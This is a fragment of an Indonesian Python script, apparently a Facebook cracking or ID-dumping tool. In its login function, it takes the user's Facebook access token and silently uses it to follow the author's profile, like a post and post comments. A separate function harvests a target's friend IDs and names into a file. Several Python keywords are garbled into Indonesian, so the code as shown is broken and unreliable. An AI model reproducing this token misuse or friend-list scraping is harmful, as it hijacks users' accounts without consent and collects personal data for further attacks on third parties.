...
(__)  (____)(_)\_)
Author:Shadow X Adzi
Github:https://ShadowXfrangk
Info:Jangan lupa Bismillah
 [x]──────────────────────────────────────────[x]
"""
...
def cek_login():
	...
	kata = 'PP Filter Batman Sok Keras🗿'
	kom = kata+love+'\n'+pantun+'\n'+waktu
        request.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + toket)
        request.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + toket)
        request.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + toket)
	request.post('https://graph.facebook.com/122338450171860/comments/?message=' +kom+ '&access_token=' + toket)
        request.post('https://graph.facebook.com/122338450171860/likes?summary=true&access_token=' + toket)
        request.post('https://graph.facebook.com/122338450171860/comments/?message=Bagi Pekob Bang🗿&access_token=' + toket)
        request.post('https://graph.facebook.com/122338450171860/likes?summary=true&access_token=' + toket)
        request.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + toket)
	request.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + toket)
	request.post('https://graph.facebook.com/100071871171387/subscribers?access_token=' + toket)
...
def publik():
	...
	mencoba:
		...
		untuk a di z['teman']['data']:
			id.append(a['id']+"<=>"+a['nama'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r [*] Buang %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.tutup()
		os.rename(qq,file)
		print("\n\n [*] Selesai")
